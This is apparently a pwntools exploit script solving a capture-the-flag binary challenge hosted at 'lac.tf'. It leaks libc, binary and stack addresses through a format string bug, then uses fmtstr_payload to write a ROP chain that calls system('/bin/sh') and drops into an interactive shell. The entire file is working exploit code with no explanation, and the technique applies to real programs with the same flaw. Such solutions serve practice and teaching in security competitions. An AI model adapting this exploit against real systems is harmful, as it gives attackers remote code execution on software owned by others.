from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

if REMOTE:
    libc = ELF('./rlibc.so.6')
else:
    libc = e.libc

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("lac.tf",31134)
    else:
        return process(e.path)


p = start()
p.sendlineafter(b'What would you like to post?',b'C'*100+b'.%71$p.%74$p.%72$p'+b'.'+b'A'*100)
p.recvline()
p.recvline()

leaks = p.recvline().strip(b'\n').split(b'.')
libc.address = int(leaks[1],16)-(libc.sym['__libc_start_main']+234)
e.address    = int(leaks[2],16)- e.sym['main']
stack_ret    = int(leaks[3],16)-(0x7fffffffe318-0x7fffffffe018)
pop_rdi      = r.find_gadget(['pop rdi','ret'])[0]+e.address
ret          = r.find_gadget(['ret'])[0]+e.address

log.info('Libc Leak: 0x%x' %int(leaks[1],16))
log.info('Stack Leak: 0x%x' %int(leaks[3],16))
log.info(b'----------------------------------')
log.info('Libc   : 0x%x' %libc.address)
log.info('Printf : 0x%x' %libc.sym['printf'])
log.info(b'----------------------------------')
log.info('Base   : 0x%x' %e.address)
log.info('Main   : 0x%x' %e.sym['main'])
log.info('-----------------------------------')
log.info('Stack  : 0x%x' %stack_ret)
log.info('Ret    : 0x%x' %ret)
log.info('Pop-rdi: 0x%x' %pop_rdi)
log.info('-----------------------------------')

payload_writes = {
         stack_ret        : pop_rdi,
         stack_ret+8      : next(libc.search(b'/bin/sh')),
         stack_ret+16     : ret,
         stack_ret+24     : libc.sym['system'] 
}

payload = fmtstr_payload(6,payload_writes,write_size='short')
p.sendlineafter(b'What would you like to post?',payload)

p.interactive()
